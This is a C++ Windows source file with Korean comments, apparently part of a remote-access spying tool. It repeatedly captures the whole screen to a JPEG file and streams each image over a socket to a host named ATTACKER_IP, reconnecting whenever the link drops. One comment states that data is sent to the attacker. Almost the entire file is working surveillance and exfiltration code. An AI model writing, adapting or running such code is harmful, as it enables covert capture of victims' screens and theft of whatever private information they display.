#include"main.h"

PVOID GetSockExtAPI(SOCKET sock, GUID guidFn)	//함수 포인터 얻는 
{
	PVOID pfn = NULL;
	GUID guid = guidFn;
	DWORD dwbytes = 0;
	LONG lRet = ::WSAIoctl
	(
		sock,									//소켓 식별	
		SIO_GET_EXTENSION_FUNCTION_POINTER,		//함수 포인터 정보 얻는다
		&guid,									//입력 버퍼에 대한 포인터
		sizeof(guid),							//입력 버퍼의 크기
		&pfn,									//출력 버퍼에 대한 포인터
		sizeof(pfn),							//출력 버퍼의 크기
		&dwbytes,								//실제 출력 바이트 수에 대한 포인터
		NULL,
		NULL);

	if (lRet == SOCKET_ERROR)
	{
		SocketError(L"WSAIoctl Error");
		return NULL;
	}
	return pfn;
}



void capture()
{

	HDC hdc = ::GetWindowDC(NULL);												//화면 전체를 캡쳐하기 위해서 window DC를 사용한다.

	CImage image;																//캡쳐에 사용할 Cimage객체를 선언한다.

	int cx = ::GetSystemMetrics(SM_CXSCREEN);									//수평 해상도를 얻는다.

	int cy = ::GetSystemMetrics(SM_CYSCREEN);									//수직 해상도를 얻는다.

	int color_pth = ::GetDeviceCaps(hdc, BITSPIXEL);							//화면의 색상 수를 얻는다

	image.Create(cx, cy, color_pth, 0);											//캡쳐에 사용할 이미지를 생성한다

	::BitBlt(image.GetDC(), 0, 0, cx, cy, hdc, 0, 0, SRCCOPY);					//화면 전체 이미지를 m_tips_image객체에 복사한다.

	image.Save(IMAGE_PATH, Gdiplus::ImageFormatJPEG);						//d:\\test.jpeg

	::ReleaseDC(NULL, hdc);														//화면 캡쳐에 사용했던 DC를 해제한다.

	image.ReleaseDC();

}

void image_trans()
{
	
	char size[4] = { 0, };
	SOCKET ssock ;
	SOCKADDR_IN saddr = { 0, };
	int errcode = 0;
	

	
	/*SOCKET ssock = socket(AF_INET, SOCK_STREAM, 0);

	if (ssock == INVALID_SOCKET)
	{
			cout << "socket failed, code : " << WSAGetLastError() << endl;

	}*/

	ssock = socket(AF_INET, SOCK_STREAM, 0);
	WSAEVENT sevent = WSACreateEvent();
	WSAEventSelect(ssock, sevent, FD_CONNECT);

	
	ZeroMemory(&saddr, sizeof(saddr));
	//std::memset(&saddr, 0, sizeof(SOCKADDR_IN));
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(IMAGE_TRANS_PORT);


	while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
	{

		if (WSAGetLastError() == WSAEISCONN)
			break;

		cout << "접속 대기중" << endl;
		Sleep(1000);
	}

	while (1) {

		DWORD dwWaitCode = MsgWaitForMultipleObjects(1, &sevent, FALSE, 30, QS_POSTMESSAGE);
		if (dwWaitCode == WAIT_FAILED)
		{
			SystemError(L"MsgWaitForMulileObject Error");
			//goto $connect;
			cout << GetLastError() << endl;
			break;
		}
		if (dwWaitCode == WAIT_OBJECT_0 + 1)
			break;
		
		WSANETWORKEVENTS ne = { 0, };
		WSAEnumNetworkEvents(ssock, sevent, &ne);

		if (ne.lNetworkEvents & FD_CONNECT) 
		{

			int errcode = ne.iErrorCode[FD_CONNECT_BIT];
			if (errcode != 0)
				goto $connect;

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_WRITE | FD_CLOSE);
			
			
			continue;
		}


		
		
		
		if (ne.lNetworkEvents & FD_CLOSE) 
		{
			
			
		$connect:
			if (ssock)
				closesocket(ssock);
			if (sevent)
				CloseHandle(sevent);

			ssock = socket(AF_INET, SOCK_STREAM, 0);
			sevent = WSACreateEvent();
			
			WSAEventSelect(ssock, sevent, FD_CONNECT);

			
			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) {

				if (WSAGetLastError() == WSAEISCONN)
					break;

				cout << "trans 재접속 대기중" << endl;

				Sleep(1000);
			}

		}

		cout << "dd" << endl;
		capture();
		//저장 경로
		wstring str = { IMAGE_PATH };

		//파일 생성
		HANDLE hfile = CreateFile(str.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hfile == INVALID_HANDLE_VALUE)
		{
			cout << str.c_str() << " open failed, code : " << GetLastError() << endl;
			goto $connect;
		}

		//파일을 열고 파일 크기를 흭득한다
		LARGE_INTEGER llsize;
		GetFileSizeEx(hfile, &llsize);

		//파일에 대한 메모리 매핑 파일 커널 객체를 생성하고 파일과 연결한다
		HANDLE hmmf = CreateFileMapping(hfile, NULL, PAGE_READONLY, llsize.HighPart, llsize.LowPart, NULL);
		if (hmmf == NULL)
		{
			cout << str.c_str() << "CreateFileMapping failed : " << GetLastError() << endl;
			goto $connect;
		}



		//공격자에게 이미지 파일 사이즈 크기 정보 전달
		ZeroMemory(size, sizeof(int));
		*((int*)size) = llsize.QuadPart;
		if (send(ssock, size, sizeof(int), 0) == SOCKET_ERROR) {
			SocketError(L"Image Size Send Error");
			goto $connect;
		}
		DWORD dwcpysize = llsize.QuadPart;

		ZeroMemory(&llsize, sizeof(LARGE_INTEGER));
		PVOID pdata = MapViewOfFile(hmmf, FILE_MAP_READ, llsize.HighPart, llsize.LowPart, dwcpysize);
		if (pdata == NULL)
		{

			SystemError(L"MapViewOfFile Error");
			goto $connect;
		}
		//파일이 매핑된 메모리의 포인터를 오프셋을 통하여 흭득한다.
		TRANSMIT_PACKETS_ELEMENT tp;
		tp.dwElFlags = TP_ELEMENT_MEMORY;		//전송할 데이터는 메모리 상의 데이터임을 알려주기 위해 TP_ELEMENT_MEMORY값을 설정한다. 그리고 메모리에 맵된 위치의 주소를 얻어서 pbuffer필드에 설정한다
		tp.cLength = dwcpysize;					//전송 바이트 수 만약0이면 전체파일전송
		tp.pBuffer = pdata;						//TP_ELEMENT_MEMORY일때만 유효하며, 전송할 데이터가 저장된 버퍼를 가리킨다


		LPFN_TRANSMITPACKETS pfntranspackets = (LPFN_TRANSMITPACKETS)GetSockExtAPI(ssock, WSAID_TRANSMITPACKETS);		//transmitpackets 함수 포인터를 얻는다

		//메모리 상의 블록을 전송한다
		BOOL blsok = pfntranspackets(ssock, &tp, 1, 0, NULL, 0);
		if (!blsok)
		{
			cout << "TransFileError : " << GetLastError() << endl;
			goto $connect;
		}

		UnmapViewOfFile(pdata);

		CloseHandle(hfile);
		CloseHandle(hmmf);
		
		printf(" <= Sent total %d bytes, program terminates...\n", dwcpysize);	//전송 크기 테스트(곧 지우길 요망)

		Sleep(20);					//30프레임

		continue;

	}

}

